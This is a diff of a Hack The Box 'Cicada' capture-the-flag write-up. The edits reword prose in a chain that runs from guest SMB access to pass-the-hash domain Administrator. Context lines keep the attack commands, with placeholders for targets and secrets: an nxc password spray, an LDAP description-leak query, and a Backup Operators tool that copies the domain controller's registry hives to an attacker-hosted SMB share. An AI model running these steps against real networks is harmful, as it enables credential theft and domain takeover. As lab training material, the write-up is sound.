@@ -32,7 +32,7 @@ outcome: "Pass-the-hash authentication as the domain Administrator after Backup 
 
 ## From guest SMB to pass-the-hash Administrator
 
-Cicada is an Easy-rated Hack The Box Windows machine that shows how several small credential exposures compound into domain administrative control. Guest SMB access exposes an onboarding notice holding a default password; password spraying maps it to a first domain account; user description attributes and a development-share backup script disclose two further credentials; and the last account's `Backup Operators` membership allows SAM and SYSTEM hive extraction from the domain controller and recovery of an administrative NTLM hash. Target identifiers, credentials, and secret values are replaced with role-based placeholders; command syntax is preserved. See [how evidence is handled](/method/).
+Cicada is an Easy-rated Hack The Box Windows machine in which a chain of small credential exposures leads to domain administrative control. Guest SMB access exposes an onboarding notice holding a default password; password spraying maps it to a first domain account; user description attributes and a development-share backup script disclose two further credentials; and the last account's `Backup Operators` membership allows SAM and SYSTEM hive extraction from the domain controller and recovery of an administrative NTLM hash. Target identifiers, credentials, and secret values are replaced with role-based placeholders; command syntax is preserved. See [how evidence is handled](/method/).
 
 **Attack path:** **Guest SMB → onboarding default password → password spray → LDAP description leak → development-share backup script → WinRM → `Backup Operators` hive dump → pass-the-hash Administrator**
 
@@ -46,7 +46,7 @@ Cicada is an Easy-rated Hack The Box Windows machine that shows how several smal
 
 ## Evidence: guest access to hive extraction
 
-The WinRM logon and the final administrative logon are recorded as outcomes without captured console output; every other result below is shown with the output that establishes it.
+No captured console output exists for the WinRM logon or the final administrative logon, so both are recorded outcomes; every other result below carries the output that establishes it.
 
 ### 1. Service Enumeration
 
@@ -75,7 +75,7 @@ PORT     STATE SERVICE       VERSION
 
 Follow-up identification places the host as `<DC_HOST>` in domain `<DOMAIN>`, with SMB signing enabled and required.
 
-Significance: the combination of DNS, Kerberos, LDAP, and WinRM identifies a domain controller, and required SMB signing removes NTLM relay over SMB as a route, pushing the path toward credential recovery rather than coercion.
+Significance: the combination of DNS, Kerberos, LDAP, and WinRM identifies a domain controller, and required SMB signing removes NTLM relay over SMB as a route, so the path moves toward credential recovery rather than coercion.
 
 Result: a Windows Server 2022 domain controller exposes SMB, LDAP, and WinRM, with SMB signing enforced.
 
@@ -163,7 +163,7 @@ nxc smb <DOMAIN> \
 SMB  <TARGET_IP>  445  <DC_HOST>  [+] <DOMAIN>\<INITIAL_DOMAIN_USER>:<DEFAULT_PASSWORD>
 ```
 
-Significance: one account still used the default onboarding password, and `--continue-on-success` keeps checking after the first hit so every matching account is found in a single pass.
+Significance: one account still used the default onboarding password; I kept `--continue-on-success` enabled so the spray checked every account after the first hit and found each match in a single pass.
 
 Result: valid domain credentials for `<INITIAL_DOMAIN_USER>`.
 
@@ -182,7 +182,7 @@ nxc ldap <DOMAIN> \
 User: <INTERMEDIATE_DOMAIN_USER> description: <INTERMEDIATE_USER_PASSWORD>
 ```
 
-Significance: a description attribute stores a plaintext password that any authenticated domain user can read, turning directory metadata into a credential store.
+Significance: a description attribute stores a plaintext password that any authenticated domain user can read; the directory itself becomes a credential store.
 
 Result: a second account's password is disclosed through LDAP.
 
@@ -255,7 +255,7 @@ NETLOGON               Logon server share
 SYSVOL                 Logon server share
 ```
 
-Significance: a service credential embedded in a backup script left on a readable share was disclosed; the exposed WinRM service on port 5985 makes the recovered credential directly usable for interactive logon.
+Significance: the backup script left a service credential on a readable share, and the exposed WinRM service on port 5985 makes the recovered credential directly usable for interactive logon.
 
 Result: the leaked credential is validated through SMB and can also reach WinRM.
 
@@ -278,7 +278,7 @@ memberof : {
 }
 ```
 
-Significance: `Remote Management Users` explains the WinRM logon, while `Backup Operators` grants the right to read protected files for backup purposes — including registry hives on a domain controller — which is the intended escalation path.
+Significance: `Remote Management Users` explains the WinRM logon, while `Backup Operators` grants the right to read protected files for backup purposes, including registry hives on a domain controller, which is the intended escalation path.
 
 Result: an interactive remote session whose account holds `Backup Operators` rights.
 
@@ -290,7 +290,7 @@ Observation: `Backup Operators` rights allow protected registry hives to be copi
 impacket-smbserver share . -smb2support
 ```
 
-The helper binary, staged from the attacker host, is run within the WinRM session and writes the hives to that share:
+The helper binary, staged from the attacker host, runs within the WinRM session and writes the hives to that share:
 
 ```powershell
 .\<BACKUP_OPERATOR_TOOL> -t \\<DC_HOST>.<DOMAIN> -o \\<ATTACKER_HOST>\<SHARE_NAME>\
@@ -340,7 +340,7 @@ Result: administrative access as the domain Administrator.
 
 ## Outcome: pass-the-hash domain Administrator
 
-The evidence establishes administrative control of the domain controller reached without exploiting a software vulnerability — each access change after the initial guest logon follows from a credential recovered in a prior step. Recovered credentials are validated through SMB or WinRM before use, and the escalation is proven by the hive-dump output and the offline hash extraction. The two interactive sessions are recorded outcomes rather than captured transcripts, and the exercise is confined to the Hack The Box lab.
+The evidence establishes administrative control of the domain controller reached without exploiting a software vulnerability; each access change after the initial guest logon follows from a credential recovered in a prior step. Each recovered credential was validated through SMB or WinRM before use, and the hive-dump output plus the offline hash extraction prove the escalation. The two interactive sessions are recorded outcomes, not captured transcripts, and I could not verify them further from the captured evidence; the exercise is confined to the Hack The Box lab.
 
 ## Recommendations: guest access, default password, LDAP, scripts, and Backup Operators
 
